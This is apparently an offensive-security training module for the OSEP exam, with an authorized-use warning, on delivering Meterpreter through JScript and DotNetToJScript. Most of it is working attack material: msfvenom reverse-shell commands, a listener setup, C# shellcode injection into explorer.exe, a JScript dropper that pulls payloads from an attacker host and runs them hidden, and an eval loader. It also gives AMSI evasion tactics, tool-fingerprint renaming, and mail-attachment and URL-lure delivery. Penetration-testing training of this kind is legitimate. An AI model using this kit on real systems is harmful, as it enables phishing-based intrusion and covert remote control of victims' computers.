::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# JScript / DotNetToJScript

If a script attachment can run but a standalone EXE cannot, bridge with JScript and a C# second stage — stay inside WSH, no EXE on disk. `cscript`/`wscript` are not limited by default AppLocker EXE rules or PowerShell ExecutionPolicy.

Three bitness points must agree: host process, assembly platform, and inject-target. On x64 Windows, `C:\Windows\System32\cscript.exe` / `wscript.exe` is 64-bit; under `SysWOW64` they are 32-bit. Mail/double-click defaults to the 64-bit host. A 64-bit host can only load x64 or AnyCPU assemblies; shellcode injected into a target process must match **that** process. Default DotNetToJScript to `--ver=v4` unless the target clearly has only .NET 2.0/3.5 (`--ver=v2` needs the ".NET Framework 3.5" feature).

## Script attachment runs, EXEs are restricted

If script entry works and running a standalone EXE does not, keep execution inside WSH/.NET — don't drop and launch an EXE.

- [ ] Generate shellcode matching the inject-target bitness
- [ ] Paste it into `m03-dotnettojscript-payload.cs`, compile as a library, and generate the bridge JS
- [ ] Confirm host bitness with the probe, then pre-validate locally with `cscript //nologo runner.js`
- [ ] Deliver `runner.js` (rename tool fingerprints first) and listen
- [ ] On callback, migrate off `wscript.exe` so closing the window does not kill the session

Generate shellcode (x64, for injecting a 64-bit process). If the host is 32-bit, use `windows/meterpreter/reverse_https` instead:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
```

Paste that output into the `PAYLOAD` byte array and compile on the tool host:

```bat
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
```

Generate the JScript bridge (serialized assembly; activated inside WSH at runtime):

```bat
DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
```

Without a Windows tool host, use SuperSharpShooter (pure Python; can take raw shellcode directly):

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
# artifact: payload.js
```

Start the listener and hosting:

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost LHOST; set lport LPORT; exploit"
python3 -m http.server 80
```

Confirm script entry and host bitness, then run the artifact:

```bat
cscript //nologo probe.js        :: prints HOST_ARCH / PROCESSOR_ARCHITECTURE
cscript //nologo runner.js
```

`runner.js` activates .NET inside the process that runs it: `cscript //nologo` on a 64-bit host needs x64 shellcode. If injecting `explorer.exe`, that process must exist and match bitness — otherwise `OpenProcess`/`CreateRemoteThread` fails silently with no session. Deliver as a mail attachment or a URL lure (reuse HTA/link techniques from module 02). Before delivery, rename tool fingerprints (`TestClass`, project GUIDs) to neutral names of the same length.

If the script entry is "download then execute" and the target can run scripts but not EXEs, `m03-simple-dropper.js` pulls the second-stage script/data file (`RUN_AFTER_DOWNLOAD=0`), then a trusted host runs it — do not let it `Run(pay.exe)` directly.

If double-click and cscript both give no callback, check bitness first: `PROCESSOR_ARCHITECTURE=AMD64` but the inject target is a 32-bit process (SysWOW64 explorer or an Office child) fails silently. Inject a same-bitness target, or compile AnyCPU and keep shellcode tied to the inject target. If a v2 artifact on Win10 reports ".NET 3.5 not enabled," regenerate with `--ver=v4`; conversely, a v4 artifact will not load on a box that only has 2.0. If `runner.js` is killed as soon as it runs, that is the next section — probe with `m03-wsh-amsi-probe.js`. If the target rejects attachment scripts but allows a URL, wrap the same JScript in `mshta http://URL/payload.hta` (module 02).

The session parent is `wscript.exe` — `migrate` immediately to `explorer`/`svchost`-class processes. Some mail gateways block `.js` — keep a URL delivery line ready.

::: details `m03-dotnettojscript-payload.cs` · click to expand

````csharp
/*
 * Purpose: C# second-stage payload — [ComVisible] class that injects shellcode
 *      into a chosen process from the constructor. Serialized into JScript by
 *      DotNetToJScript / SuperSharpShooter; deserialized and activated inside
 *      the WSH process with no EXE on disk (scenario 9 main path).
 * Scenario: 9, 10 (quick-reference notes JScript > Meterpreter Loader with DotNetToJScript)
 * Dependencies: .NET Framework SDK csc.exe (compile on a Windows tool host);
 *      runtime needs the matching CLR (v4 by default). Injected target process
 *      must exist and match bitness.
 * Usage:
 *  1) Generate shellcode (x64 into a 64-bit process):
 *       msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
 *     For x86 targets / 32-bit hosts use: -p windows/meterpreter/reverse_https ...
 *  2) Replace the PAYLOAD array below with that byte[] output.
 *  3) Compile on the tool host (AnyCPU works with 32/64-bit hosts; final
 *     bitness is driven by the injected target process):
 *       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
 *  4) Generate bridge JS and deliver (see docs/03 scenario 9 step 3):
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 * Placeholders: PAYLOAD (msfvenom -f csharp bytes), TARGET_PROCESS (default explorer)
 * Test status: Not compiled / not lab-tested; structure matches the quick-reference notes
 *     TestClass.cs — compile on a tool host and verify on a lab target before use.
 */

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class Payload
{
    // Inject target: a long-lived process matching local architecture / logon session.
    // x64 shellcode -> 64-bit explorer.exe; x86 shellcode -> 32-bit process (e.g. under SysWOW64).
    private const string TARGET_PROCESS = "explorer";

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    public Payload()
    {
        // Paste the full msfvenom -f csharp byte[] here (replace the placeholder below)
        byte[] buf = new byte[] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00, /* PAYLOAD ... */
            /* ... full shellcode bytes ... */
        };

        // 1. Open inject target (0x001F0FFF = PROCESS_ALL_ACCESS)
        Process[] procs = Process.GetProcessesByName(TARGET_PROCESS);
        if (procs.Length == 0)
        {
            // Fail with feedback: if no target process, inject self or change to another resident name
            return;
        }
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, procs[0].Id);
        if (hProcess == IntPtr.Zero) return;

        // 2. Allocate RWX memory in the target
        //    0x3000 = MEM_COMMIT|MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) return;

        // 3. Write shellcode and start a remote thread
        IntPtr written;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out written);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    // Alternate entry: besides the constructor, DotNetToJScript-serialized classes
    // can expose methods for the script side to call explicitly
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
````

:::

::: details `m03-dotnettojscript-loader.js` · click to expand

````javascript
/*
 * Purpose: Skeleton/paste container for DotNetToJScript bridge artifacts +
 *      host preflight. DotNetToJScript.exe serializes a C# assembly into a
 *      full runner.js (hundreds of lines of base64). This file: (a) records
 *      the standard generation commands; (b) preflights host bitness/.NET
 *      before delivery; (c) when hand-assembling, paste the tool output into
 *      the paste zone below.
 * Scenario: 9, 10 (quick-reference notes JScript > Meterpreter Loader with DotNetToJScript)
 * Dependencies: Windows tool host + DotNetToJScript.exe; target WSH + .NET
 *      (v4 or v2).
 * Usage:
 *  1) Generate the full artifact (artifact runs standalone — this file optional):
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 *  2) Local preflight (put artifact beside this file and run this file for host info):
 *       cscript //nologo m03-dotnettojscript-loader.js
 *  3) If hand-pasting: paste the entire tool output between PASTE_BEGIN/PASTE_END
 *     below, save, then run with cscript.
 * Placeholders: none (host info is read automatically); paste zone is tool
 *      output — do not hand-edit the base64.
 * Test status: host-preflight logic JS-syntax checked (node --check);
 *     artifact generation/activation needs a Windows lab environment.
 */

// ===================== Host preflight (read-only; does not change the artifact) =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var env = new ActiveXObject("WScript.Shell").Environment("Process");

WScript.Echo("[*] Host            : " + WScript.FullName);
WScript.Echo("[*] OS architecture : " + env("PROCESSOR_ARCHITECTURE"));
// Host bitness decides which assembly platforms can load: 64-bit host -> x64/AnyCPU; 32-bit host -> x86/AnyCPU
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("[!] This process is 32-bit (running on x64 OS) — payload needs x86 or AnyCPU");
}

// .NET version directory probe: v4 usually present; v2/v3.5 needs the feature enabled
var windir = env("WINDIR");
var net4 = windir + "\\Microsoft.NET\\Framework64\\v4.0.30319";
var net2 = windir + "\\Microsoft.NET\\Framework64\\v2.0.50727";
WScript.Echo("[*] .NET v4 dir     : " + (fso.FolderExists(net4) ? "present" : "missing"));
WScript.Echo("[*] .NET v2 dir     : " + (fso.FolderExists(net2) ? "present" : "missing"));
if (!fso.FolderExists(net4) && !fso.FolderExists(net2)) {
    WScript.Echo("[!] No .NET Framework directories found; DotNetToJScript v4/v2 artifacts cannot run");
    WScript.Quit(1);
}

// ===================== Paste zone =====================
// Paste the full JS generated by DotNetToJScript here (including its own
// var serialized_obj = "..." and later deserialize/activate code), and remove
// the two placeholder lines below.
// Match artifact to host bitness/.NET version (v2 artifacts need .NET 2.0/3.5).
// PASTE_BEGIN
WScript.Echo("[*] Paste zone empty: run DotNetToJScript first to generate the artifact,");
WScript.Echo("[*] or deliver the runner.js artifact as the attachment directly (recommended; do not hand-edit).");
WScript.Echo("[*] Host info above confirms whether artifact platform (--ver / compile platform) matches.");
// PASTE_END

WScript.Quit(0);
````

:::

::: details `m03-simple-dropper.js` · click to expand

````javascript
/*
 * Purpose: Minimal JScript downloader — pull a file from attacker HTTP to the
 *      target and save it; optionally execute. Transport layer for scenarios
 *      9/10 when "script entry works": download stage-2 script/data and avoid
 *      putting attack logic in the attachment body (scenario 10 A/B split,
 *      stage A).
 * Scenario: 9, 10 (quick-reference notes JScript > Simple Meterpreter Dropper)
 * Dependencies: Windows Script Host (cscript / wscript); target can reach
 *      attacker HTTP; MSXML2.XMLHTTP and ADODB.Stream are built-in.
 * Usage:
 *   Target (prefer cscript for stdout; wscript double-click uses message boxes):
 *     cscript //nologo m03-simple-dropper.js
 *   Attacker: python3 -m http.server 80   (host the PAYLOAD file)
 * Placeholders: URL=http://LHOST/PAYLOAD   DROP_PATH=C:\Users\Public\PAYLOAD
 *      RUN_AFTER_DOWNLOAD=0/1 (1 = run downloaded .js with a new cscript process
 *      for A/B separation)
 * Test status: JS syntax checked with node --check; not tested under Windows
 *     WSH; structure follows the quick-reference notes Simple Meterpreter Dropper —
 *     verify in the lab.
 * Note: this file only downloads and (optionally) runs files you yourself host
 *     for authorized testing.
 */

var URL = "http://LHOST/PAYLOAD";          // required: attacker host URL + filename
var DROP_PATH = "C:\\Users\\Public\\PAYLOAD"; // required: absolute save path (match URL filename for stability)
var RUN_AFTER_DOWNLOAD = 0;                // 1 = after download, run DROP_PATH with a new cscript process

var http = new ActiveXObject("MSXML2.XMLHTTP");

WScript.Echo("[*] GET " + URL);
http.Open("GET", URL, false);              // synchronous — blocks until done
http.Send();

if (http.Status !== 200) {
    WScript.Echo("[!] HTTP request failed, status: " + http.Status);
    WScript.Quit(1);
}

// ResponseBody is a binary array; ADODB.Stream writes bytes to disk (Type=1 = binary)
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(http.ResponseBody);
stream.Position = 0;
stream.SaveToFile(DROP_PATH, 2);           // 2 = overwrite if exists
stream.Close();

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FileExists(DROP_PATH)) {
    WScript.Echo("[!] File was not saved: " + DROP_PATH);
    WScript.Quit(1);
}
WScript.Echo("[+] Saved " + DROP_PATH + " (" + fso.GetFile(DROP_PATH).Size + " bytes)");

if (RUN_AFTER_DOWNLOAD === 1) {
    // Scenario 10: run downloaded stage B in a "new process" to avoid continuing
    // complex content inside the attachment process's scan context
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = 'cscript //nologo "' + DROP_PATH + '"';
    WScript.Echo("[*] Exec: " + cmd);
    shell.Run(cmd, 0, false);              // 0 = hidden window, do not wait
}
WScript.Quit(0);
````

:::


## Simple content runs, complex scripts are blocked

If a simple dropper runs on the same script entry but a .NET bridge or richer stage two is blocked, treat it as content scanning. AMSI bypasses proven in PowerShell do not move into WSH — those rely on reflection inside a PS runspace, and WSH is an unmanaged host.

- [ ] Run `m03-wsh-amsi-probe.js` locally and on the target; record host bitness, .NET directories, and PASS/BLOCKED
- [ ] Bisect: variant 1 only echoes/downloads; variant 2 adds only the "load .NET bridge" call
- [ ] Split stage two: clean dropper in the attachment, artifact pulled and run in a **new** `cscript` process
- [ ] If stage B is still blocked, swap artifacts with `m03-supersharpshooter-loader.js`, or change host to `mshta`

Run the probe:

```bat
cscript //nologo m03-wsh-amsi-probe.js
```

AMSI on Windows 10+ scans content dynamically fed into the script engine (`eval` / `Execute`, concatenated script text). A pure download dropper's file body can look harmless; a large embedded blob or live `eval` of attack text may be blocked. Binary/serialized base64 is opaque to the engine, so DotNetToJScript artifacts often pass content scanning.

Split design: stage A (attachment/URL `.js`) only downloads / reads / does harmless scheduling. Stage B is the DotNetToJScript or SuperSharpShooter artifact, dropped locally then pulled/executed by A — or a second independent attachment. Set the dropper to:

```js
// m03-simple-dropper.js params: URL=http://URL/payload.js  DROP_PATH=C:\\Users\\Public\\payload.js  RUN_AFTER_DOWNLOAD=1
```

With `RUN_AFTER_DOWNLOAD=1`, `WScript.Shell.Run('cscript //nologo "' + DROP_PATH + '"', 0, false)` runs stage B in a new process. If you still need "complex content," regenerate with SuperSharpShooter's AMSI-related options (see its README evasion flags) — don't hand-write PS-style bypasses. `m03-supersharpshooter-loader.js` reads same-dir `payload.js` then runs, so you can try different artifacts without repeatedly changing the attachment.

If variant 1 works and variant 2 dies, the block is in the bridge content — A/B split + new process, or regenerate the bridge with SuperSharpShooter AMSI options. If even stage A's download domain/IP is blocked, that is network (URL reputation/proxy), not AMSI content — switch to HTTPS + a normal UA/cert (module 09), or give the full artifact as a mail attachment. If the probe's `eval` section is BLOCKED, design to **avoid eval'ing attack text in WSH**: keep stage 2 serialized/binary or in an independent process, and keep the script body static and harmless. If PS-usable AMSI bypass code errors or no-ops in JScript, don't port it — WSH cannot `Add-Type` / reflect-patch like PowerShell; use a generator with AMSI handling, or change host (`mshta` / Office, modules 01 and 02).

Confirm it is a block, not a timing/lifecycle issue (module 02): after a split download/execute, check whether the file landed and the process started before concluding "killed." The probe may pop AV alerts and leave log signatures — one-shot filenames, never treat it as the final payload. AMSI blocks dynamic content, not filenames — spend effort on an opaque body, segments, and changing host. Record which host + content passed, and pick a known-good combination on the exam.

::: details `m03-wsh-amsi-probe.js` · click to expand

````javascript
/*
 * Purpose: WSH-host AMSI lab probe (scenario 10). Two parts:
 *  (A) Report host info: script-host path/bitness, OS architecture, whether
 *      .NET v4/v2 directories exist — these decide whether DotNetToJScript /
 *      SuperSharpShooter artifacts can load;
 *  (B) Dynamic-content experiment: eval/load a string known to be AMSI-flagged
 *      and a plain string; use exceptions and survival to infer whether this
 *      host has AMSI content scanning. Lab-only for locating the block point;
 *      not a final payload.
 * Scenario: 10 (course §12.6; PS AMSI bypasses do not move into WSH —
 *      probe the host first, then choose a path)
 * Dependencies: Windows Script Host (cscript/wscript); results depend on the
 *      local AV/AMSI provider (with no third-party AV, Defender on/off drives
 *      output) — retest in a same-class environment as the target.
 * Usage: cscript //nologo m03-wsh-amsi-probe.js
 * Placeholders: none (read-only host info + lab strings; change
 *      EVAL_TEST_CONTENT as needed)
 * Test status: JS syntax checked (node --check); PASS/BLOCKED judgment needs
 *      a real Windows + Defender environment — cannot reproduce on this host.
 */

// ===================== (A) Host info =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var env = shell.Environment("Process");
var windir = env("WINDIR");

WScript.Echo("== (A) Host info ==");
WScript.Echo("  Script host     : " + WScript.FullName);          // ...cscript.exe / wscript.exe
WScript.Echo("  OS architecture : " + env("PROCESSOR_ARCHITECTURE"));
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("  -> This process is 32-bit (x64 OS): payload needs x86/AnyCPU");
}
WScript.Echo("  amsi.dll(64)    : " +
    (fso.FileExists(windir + "\\System32\\amsi.dll") ? "present" : "missing"));
WScript.Echo("  amsi.dll(32)    : " +
    (fso.FileExists(windir + "\\SysWOW64\\amsi.dll") ? "present" : "missing"));
WScript.Echo("  .NET v4 (F64)   : " +
    (fso.FolderExists(windir + "\\Microsoft.NET\\Framework64\\v4.0.30319") ? "present" : "missing"));
WScript.Echo("  .NET v2 (F64)   : " +
    (fso.FolderExists(windir + "\\Microsoft.NET\\Framework64\\v2.0.50727") ? "present" : "missing"));

// ===================== (B) Dynamic content experiment =====================
WScript.Echo("");
WScript.Echo("== (B) Dynamic content (eval) experiment ==");
WScript.Echo("  Results depend on local AV/AMSI: PASS=ran, BLOCKED=blocked/killed, ERROR=other");

// Plain string: should not trigger content scanning
try {
    eval("var _t_plain = 'hello world';");
    WScript.Echo("  [1] Plain-string eval        : PASS");
} catch (e1) {
    WScript.Echo("  [1] Plain-string eval        : ERROR (" + e1.message + ")");
}

// String known to be AMSI-flagged (lab purpose, not a real payload):
// This content should not produce any effect — only observe whether it is blocked.
// (A.2) PEN-300 §12.6 check/set HKCU AmsiEnable registry value (book uses "Windows Script", not "Windows Script Host")
var amsiRegPath = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try {
    var curAmsi = shell.RegRead(amsiRegPath);
    WScript.Echo("  HKCU AmsiEnable: " + curAmsi + " (0=WSH AMSI disabled)");
} catch (eReg) {
    WScript.Echo("  HKCU AmsiEnable: not set (enabled by default; disable via shell.RegWrite(amsiRegPath, 0, 'REG_DWORD'))");
}

var EVAL_TEST_CONTENT = "var x = 'Invoke-Mimikatz';"; // replace with a minimal signature fragment of content you plan to deliver
try {
    eval(EVAL_TEST_CONTENT);
    WScript.Echo("  [2] Signature-string eval    : PASS (host did not block this content, or AMSI inactive)");
} catch (e2) {
    WScript.Echo("  [2] Signature-string eval    : BLOCKED/ERROR (" + e2.message + ")");
    WScript.Echo("      -> Host scans dynamic content; design delivery to avoid eval'ing attack text");
}

WScript.Echo("");
WScript.Echo("== Quick conclusions ==");
WScript.Echo("  Host bitness + .NET dirs -> decide DotNetToJScript --ver and platform");
WScript.Echo("  [2] if BLOCKED      -> Scenario 10: split stage 2 / new process / change host (mshta/Office)");
WScript.Echo("  [2] if PASS         -> Block may be file body / network, not dynamic content — keep bisecting");

WScript.Quit(0);
````

:::

::: details `m03-supersharpshooter-loader.js` · click to expand

````javascript
/*
 * Purpose: "Split stage-2" loader for SuperSharpShooter artifacts (scenario 10
 *      lab shape). Attachment contains only this file (clean body); at runtime
 *      it reads same-dir / given-path payload.js (SuperSharpShooter stage 2)
 *      and executes it. Useful for swapping artifacts quickly on a target and
 *      for testing whether "A/B split + new process" dodges content scanning.
 * Scenario: 10, 9 alternate (quick-reference notes JScript > Meterpreter with SuperSharpShooter)
 * Dependencies: target WSH; payload.js from SuperSharpShooter (tool-host Python is enough):
 *      msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
 *      ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
 * Usage:
 *  1) Place generated payload.js beside this file on the target (pull via
 *     m03-simple-dropper.js from attacker hosting, or a second attachment).
 *  2) On the target run:
 *       cscript //nologo m03-supersharpshooter-loader.js
 * Placeholders: STAGE2_JS=payload.js (relative/absolute path)
 * Test status: JS syntax checked (node --check); actual load/activate needs
 *     a lab environment — if this shape is still blocked, see docs/03
 *     scenario 10 failure branches (change host / artifact options).
 */

var STAGE2_JS = "payload.js";      // same name as generated artifact; may be absolute C:\\...\\payload.js

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FileExists(STAGE2_JS)) {
    WScript.Echo("[!] Stage 2 not found: " + STAGE2_JS);
    WScript.Echo("[*] Download with the dropper first, or place payload.js beside this file");
    WScript.Quit(1);
}

WScript.Echo("[*] Reading and executing stage 2: " + STAGE2_JS);

// Read entire file then eval: content is mostly opaque base64 from the tool.
// Note: eval is "dynamically executed content"; if target AMSI covers this host
// and the artifact text has signatures, this shape may be blocked — that is
// exactly the experiment. If blocked, switch to a new independent process /
// different artifact / different host.
var textStream = fso.OpenTextFile(STAGE2_JS, 1, false, -1); // 1=read-only, -1=system default (ASCII-compatible)
var stage2 = textStream.ReadAll();
textStream.Close();

try {
    eval(stage2);
    WScript.Echo("[+] Stage 2 executed (no exception)");
} catch (err) {
    // Fail with feedback: distinguish "content blocked/exception" vs "host mismatch"
    WScript.Echo("[!] Stage 2 execution exception: " + err.message);
    WScript.Echo("[*] If this is AMSI/AV, switch to an independent new process or a different artifact (see docs/03 scenario 10)");
    WScript.Quit(2);
}

WScript.Quit(0);
````

:::


## Cheat sheet

| You want to… | Use |
|---|---|
| Confirm host bitness / .NET / AMSI | `m03-wsh-amsi-probe.js` |
| C# stage two (`[ComVisible]` inject class) | `m03-dotnettojscript-payload.cs` → `payload.dll` |
| Bridge JS | `DotNetToJScript.exe payload.dll --lang=Jscript --ver=v4 -o runner.js` |
| No Windows tool host | SuperSharpShooter → `payload.js` |
| Download only (A/B split) | `m03-simple-dropper.js` (`RUN_AFTER_DOWNLOAD=0` or `1`) |
| Swap stage-two artifacts on target | `m03-supersharpshooter-loader.js` |
| Script blocked, URL allowed | Wrap the same JScript in `mshta` (module 02) |
